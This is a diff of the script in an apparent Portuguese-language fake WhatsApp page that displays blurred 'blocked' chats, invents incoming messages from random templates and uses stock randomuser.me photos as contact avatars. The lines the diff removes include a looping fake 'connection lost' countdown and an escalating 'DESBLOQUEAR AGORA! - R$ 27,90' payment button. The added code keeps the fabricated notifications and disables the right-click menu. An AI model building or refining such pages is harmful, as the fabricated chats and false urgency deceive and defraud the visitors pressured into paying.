+                previewElement.textContent = randomMessage;
+                previewElement.classList.add('blurred-text');
+            }
             
-            // Adicionar efeito de notificação
-            conversationItem.style.backgroundColor = 'rgba(37, 211, 102, 0.1)';
-            
-            // Restaurar após 10 segundos
-            setTimeout(() => {
-                timeElement.textContent = originalTime;
+            // Atualizar hora para "Agora"
+            const timeElement = document.getElementById(`time-${chatId}`);
+            if (timeElement) {
+                timeElement.textContent = 'Agora';
                 timeElement.classList.add('blurred-text');
-                timeElement.style.color = '';
-                previewElement.innerHTML = originalPreview;
-                conversationItem.style.backgroundColor = '';
-            }, 10000);
+            }
+            
+            // Atualizar badge
+            const badgeElement = document.getElementById(`badge-${chatId}`);
+            if (badgeElement) {
+                badgeElement.textContent = unreadMessagesCount[chatId];
+                badgeElement.style.display = 'flex';
+                badgeElement.style.animation = 'newMessageAnimation 0.3s ease';
+            }
+            
+            // Destacar conversa
+            const conversationItem = conversationItems[chatId];
+            if (conversationItem) {
+                conversationItem.classList.add('new-message');
+                setTimeout(() => {
+                    conversationItem.classList.remove('new-message');
+                }, 2000);
+                
+                // Mover para o topo da seção
+                moveConversationToTop(chatId, chatData[chatId].section);
+            }
+            
+            // Atualizar contador total
+            updateTotalUnreadCount();
         }
-        
-        // Simular que alguém está digitando
-        function simulateTyping(chatId) {
-            const conversationItem = document.querySelector(`.conversation-item[data-chat="${chatId}"]`);
+
+        // Mover conversa para o topo da seção
+        function moveConversationToTop(chatId, section) {
+            const conversationItem = conversationItems[chatId];
             if (!conversationItem) return;
             
-            const previewElement = conversationItem.querySelector('.conversation-preview');
-            if (!previewElement) return;
-            
-            // Salvar o estado original
-            const originalPreview = previewElement.innerHTML;
-            
-            // Mostrar indicador de digitação
-            previewElement.innerHTML = `
-                <span class="typing-indicator" style="flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis;">
-                    digitando
-                    <span class="typing-dot"></span>
-                    <span class="typing-dot"></span>
-                    <span class="typing-dot"></span>
-                </span>
-                <span class="locked-badge">🔒</span>
-            `;
-            
-            // Restaurar após 5 segundos
-            setTimeout(() => {
-                previewElement.innerHTML = originalPreview;
-            }, 5000);
-        }
-        
-        // Iniciar timer de conexão
-        function startConnectionTimer() {
-            if (timerStarted) return;
-            
-            timerStarted = true;
-            connectionTimer.style.display = 'flex';
-            
-            // Mostrar botão de desbloquear conexão após 2 segundos
-            setTimeout(function() {
-                unlockConnectionButton.style.display = 'block';
-                connectionButtonShown = true;
-                
-                // Programar para remover o botão após 30 segundos
-                removeButtonTimeout = setTimeout(removeConnectionButton, 30000);
-            }, 2000);
-            
-            // Iniciar contagem regressiva
-            timerInterval = setInterval(updateTimer, 1000);
-        }
-        
-        // Atualizar timer
-        function updateTimer() {
-            timeLeft--;
-            
-            if (timeLeft <= 0) {
-                clearInterval(timerInterval);
-                timerCountdown.textContent = '00:00';
-                
-                // Mostrar mensagem de conexão perdida
-                const timerIcon = connectionTimer.querySelector('.timer-icon');
-                const timerText = connectionTimer.querySelector('.timer-text');
-                if (timerIcon) timerIcon.innerHTML = '<i class="bi bi-exclamation-triangle"></i>';
-                if (timerText) timerText.textContent = 'Conexão perdida! Reconectando...';
-                timerCountdown.style.display = 'none';
-                
-                // Remover botão de desbloquear conexão
-                removeConnectionButton();
-                
-                // Após 10 segundos, reiniciar o timer
-                setTimeout(function() {
-                    // Restaurar o conteúdo do timer
-                    if (timerIcon) timerIcon.innerHTML = '<i class="bi bi-wifi-off"></i>';
-                    if (timerText) timerText.textContent = 'Conexão instável • Tempo até desconectar:';
-                    timerCountdown.style.display = 'block';
-                    resetTimer();
-                }, 10000);
-                
+            let container;
+            if (section === 'blocked') {
+                container = blockedConversations;
+            } else if (section === 'groups') {
+                container = groupConversations;
+            } else if (section === 'new') {
+                container = newConversations;
+            } else {
                 return;
             }
             
-            // Formatar o tempo como MM:SS
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            timerCountdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            
-            // Adicionar classe de warning quando o tempo estiver acabando
-            if (timeLeft <= 60) {
-                connectionTimer.classList.add('timer-warning');
-                
-                // Intensificar a pulsação do botão de conexão
-                if (timeLeft <= 30) {
-                    unlockConnectionButton.querySelector('.unlock-connection-link').style.animation = 'pulse-green 0.8s infinite';
-                    
-                    // Mudar a cor para vermelho nos últimos 10 segundos
-                    if (timeLeft <= 10) {
-                        unlockConnectionButton.querySelector('.unlock-connection-link').style.background = 'linear-gradient(135deg, #dc2626, #b91c1c)';
-                        unlockConnectionButton.querySelector('.unlock-connection-link').style.boxShadow = '0 4px 15px rgba(220, 38, 38, 0.3)';
-                        unlockConnectionButton.querySelector('.unlock-connection-link').innerHTML = '<i class="bi bi-exclamation-triangle"></i> DESBLOQUEAR AGORA! - R$ 27,90';
-                    }
+            // Remover do container atual
+            if (conversationItem.parentNode === container) {
+                container.removeChild(conversationItem);
+                // Inserir no topo (após o primeiro filho que é o section-title)
+                const sectionTitle = container.previousElementSibling;
+                if (sectionTitle && sectionTitle.classList.contains('section-title')) {
+                    container.insertBefore(conversationItem, container.firstChild);
                 }
             }
         }
-        
-        // Remover botão de desbloquear conexão
-        function removeConnectionButton() {
-            if (unlockConnectionButton.style.display === 'block') {
-                // Adicionar animação de fade out
-                unlockConnectionButton.classList.add('fade-out');
-                
-                // Remover após a animação
-                setTimeout(() => {
-                    unlockConnectionButton.style.display = 'none';
-                    unlockConnectionButton.classList.remove('fade-out');
-                    connectionButtonShown = false;
-                }, 500);
-            }
-            
-            // Limpar o timeout se existir
-            if (removeButtonTimeout) {
-                clearTimeout(removeButtonTimeout);
-                removeButtonTimeout = null;
-            }
-        }
-        
-        // Resetar timer
-        function resetTimer() {
-            clearInterval(timerInterval);
-            timerInterval = null;
-            timerStarted = false;
-            timeLeft = 300; // 5 minutos
-            timerCountdown.textContent = '05:00';
-            connectionTimer.classList.remove('timer-warning');
-            
-            // Resetar o botão de desbloquear conexão
-            const unlockLink = unlockConnectionButton.querySelector('.unlock-connection-link');
-            unlockLink.style.background = 'linear-gradient(135deg, #10b981, #059669)';
-            unlockLink.style.boxShadow = '0 4px 15px rgba(16, 185, 129, 0.3)';
-            unlockLink.style.animation = 'pulse-green 1.5s infinite';
-            unlockLink.innerHTML = '<i class="bi bi-wifi"></i> DESBLOQUEAR E MANTER CONEXÃO - R$ 27,90';
-            
-            // Remover botão
-            removeConnectionButton();
-            
-            // Esconder o timer temporariamente
-            connectionTimer.style.display = 'none';
-            
-            // Reiniciar o timer após 5 segundos
-            setTimeout(function() {
-                startConnectionTimer();
-            }, 5000);
-        }
-        
-        // Mostrar pop-up de notificação
-        function showPopupNotification() {
-            if (popupShown) return;
-            
-            popupShown = true;
-            popupNotification.classList.add('show');
-            
-            // Adicionar novas conversas após 2 segundos do pop-up
-            setTimeout(addNewConversations, 2000);
-        }
-        
-        // Fechar pop-up de notificação
-        function closePopupNotification() {
-            popupNotification.classList.remove('show');
-        }
-        
-        // Adicionar novas conversas à lista
-        function addNewConversations() {
-            if (newConversationsAdded) return;
-            
-            newConversationsAdded = true;
-            const conversationsList = document.querySelector('.conversations-list');
-            const newConversations = document.querySelectorAll('.new-conversation');
-            
-            // Mostrar novas conversas com animação
-            newConversations.forEach((conversation, index) => {
-                setTimeout(() => {
-                    conversation.style.display = 'flex';
-                    conversation.style.animation = 'fadeIn 0.5s ease-in-out';
-                    
-                    // Adicionar evento de clique
-                    conversation.addEventListener('click', function(e) {
-                        if (e.detail > 1) return;
-                        selectConversation(this);
-                        openChat(this.dataset.chat);
-                    });
-                }, index * 300); // Delay entre cada nova conversa
+
+        // Atualizar contador total de mensagens não lidas
+        function updateTotalUnreadCount() {
+            let total = 0;
+            Object.values(unreadMessagesCount).forEach(count => {
+                total += count;
             });
             
-            // Atualizar contador
-            setTimeout(updateBlockedConversationsCount, 1000);
-            
-            // Atualizar subtítulo do header
-            const headerSubtitle = document.querySelector('.header-subtitle');
-            headerSubtitle.textContent = '10 conversas bloqueadas';
-            headerSubtitle.classList.add('blurred-text');
-            
-            // Adicionar badge "NOVO" no título
-            const headerTitle = document.querySelector('.header-title');
-            const originalText = headerTitle.innerHTML;
-            headerTitle.innerHTML = originalText + ' <span style="background-color: #dc2626; color: white; padding: 2px 6px; border-radius: 10px; font-size: 10px; margin-left: 5px; flex-shrink: 0;">NOVO</span>';
-        }
-        
-        // Atualizar contador de conversas bloqueadas
-        function updateBlockedConversationsCount() {
-            const totalConversations = document.querySelectorAll('.conversation-item').length;
-            const visibleConversations = Array.from(document.querySelectorAll('.conversation-item')).filter(item => 
-                item.style.display !== 'none'
-            ).length;
-            
-            const headerSubtitle = document.querySelector('.header-subtitle');
-            if (headerSubtitle) {
-                headerSubtitle.textContent = `${visibleConversations} conversas bloqueadas`;
+            if (total > 0) {
+                totalUnreadCount.textContent = total > 99 ? '99+' : total;
+                totalUnreadCount.style.display = 'flex';
+            } else {
+                totalUnreadCount.style.display = 'none';
             }
         }
-        
+
         // Selecionar conversa na lista
         function selectConversation(conversationItem) {
             // Remover seleção anterior
@@ -1742,41 +1489,59 @@
             // Adicionar seleção atual
             conversationItem.classList.add('selected');
         }
-        
+
         // Abrir tela do chat
         function openChat(chatId) {
             if (!chatData[chatId]) return;
             
+            currentChatId = chatId;
             const chat = chatData[chatId];
             
             // Atualizar informações do chat
             chatName.textContent = chat.name;
             
-            if (chat.avatar) {
-                chatAvatar.src = chat.avatar;
-                chatAvatar.style.display = 'block';
-            } else if (chat.isGroup) {
+            // Gerar avatar aleatório
+            if (chat.isGroup) {
                 chatAvatar.style.display = 'none';
+            } else {
+                const gender = chat.gender || (Math.random() > 0.5 ? 'men' : 'women');
+                const randomId = chat.avatarId || Math.floor(Math.random() * 99) + 1;
+                chatAvatar.src = `https://randomuser.me/api/portraits/${gender}/${randomId}.jpg`;
+                chatAvatar.style.display = 'block';
+                chatAvatar.classList.add('blurred-avatar');
             }
             
             // Status online
-            chatOnlineDot.style.backgroundColor = chat.online ? '#31a24c' : '#8696a0';
+            chatOnlineDot.style.backgroundColor = chat.online ? '#31a24c' : '#667781';
             chatStatus.textContent = chat.online ? 'Online • Horário bloqueado' : 'Visto por último às 18:30 • Horário bloqueado';
             
             // Carregar mensagens
             loadChatMessages(chat.messages);
             
-            // Alternar telas
+            // Limpar mensagens não lidas desta conversa
+            clearUnreadMessages(chatId);
+            
+            // Mostrar tela do chat e esconder tela de conversas
             conversationsScreen.classList.remove('active');
             conversationsScreen.classList.add('hidden');
             chatScreen.classList.remove('hidden');
             chatScreen.classList.add('active');
-            
-            // Esconder timer e botão na tela do chat
-            connectionTimer.style.display = 'none';
-            unlockConnectionButton.style.display = 'none';
         }
-        
+
+        // Limpar mensagens não lidas de uma conversa
+        function clearUnreadMessages(chatId) {
+            unreadMessagesCount[chatId] = 0;
+            
+            // Atualizar badge
+            const badgeElement = document.getElementById(`badge-${chatId}`);
+            if (badgeElement) {
+                badgeElement.style.display = 'none';
+            }
+            
+            // Atualizar contador total
+            updateTotalUnreadCount();
+        }
+
         // Carregar mensagens no chat
         function loadChatMessages(messages) {
             chatMessages.innerHTML = '';
@@ -1787,62 +1552,63 @@
             dateElement.textContent = 'HOJE';
             chatMessages.appendChild(dateElement);
             
-            // Adicionar mensagens
-            messages.forEach(msg => {
-                const messageElement = document.createElement('div');
-                messageElement.className = `message message-${msg.type} blurred-message`;
-                
-                const contentElement = document.createElement('div');
-                contentElement.className = 'message-content blurred-text';
-                contentElement.textContent = msg.content;
-                
-                const timeElement = document.createElement('span');
-                timeElement.className = 'message-time blurred-text';
-                timeElement.textContent = msg.time;
-                
-                messageElement.appendChild(contentElement);
-                messageElement.appendChild(timeElement);
-                chatMessages.appendChild(messageElement);
+            // Adicionar mensagens com animação sequencial
+            messages.forEach((msg, index) => {
+                setTimeout(() => {
+                    const messageElement = document.createElement('div');
+                    messageElement.className = `message message-${msg.type} blurred-message`;
+                    messageElement.style.animationDelay = `${index * 0.1}s`;
+                    
+                    const contentElement = document.createElement('div');
+                    contentElement.className = 'message-content blurred-text';
+                    contentElement.textContent = msg.content || messageTemplates[Math.floor(Math.random() * messageTemplates.length)];
+                    
+                    const timeElement = document.createElement('span');
+                    timeElement.className = 'message-time blurred-text';
+                    timeElement.textContent = msg.time;
+                    
+                    messageElement.appendChild(contentElement);
+                    messageElement.appendChild(timeElement);
+                    chatMessages.appendChild(messageElement);
+                    
+                    // Scroll suave para o final
+                    if (index === messages.length - 1) {
+                        setTimeout(() => {
+                            chatMessages.scrollTo({
+                                top: chatMessages.scrollHeight,
+                                behavior: 'smooth'
+                            });
+                        }, 100);
+                    }
+                }, index * 100);
             });
-            
-            // Scroll para o final
-            setTimeout(() => {
-                chatMessages.scrollTop = chatMessages.scrollHeight;
-            }, 100);
         }
-        
+
         // Voltar para lista de conversas
         function goBackToConversations() {
+            // Mostrar tela de conversas e esconder tela do chat
             chatScreen.classList.remove('active');
             chatScreen.classList.add('hidden');
             conversationsScreen.classList.remove('hidden');
             conversationsScreen.classList.add('active');
-            
-            // Mostrar timer e botão novamente
-            if (timerStarted) {
-                connectionTimer.style.display = 'flex';
-                if (connectionButtonShown) {
-                    unlockConnectionButton.style.display = 'block';
-                }
-            }
         }
-        
-        // Prevenir zoom em duplo toque no mobile
+
+        // Prevenir comportamentos indesejados
         let lastTouchEnd = 0;
         document.addEventListener('touchend', function(event) {
-            const now = (new Date()).getTime();
+            const now = Date.now();
             if (now - lastTouchEnd <= 300) {
                 event.preventDefault();
             }
             lastTouchEnd = now;
         }, false);
-        
-        // Prevenir menu de contexto
+
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
+            return false;
         });
-        
-        // Melhorar performance em mobile
+
+        // Otimizações de performance
         window.addEventListener('load', function() {
             setTimeout(function() {
                 window.scrollTo(0, 1);
@@ -1851,7 +1617,3 @@
     </script>
 </body>
 </html>
-
-
-
-
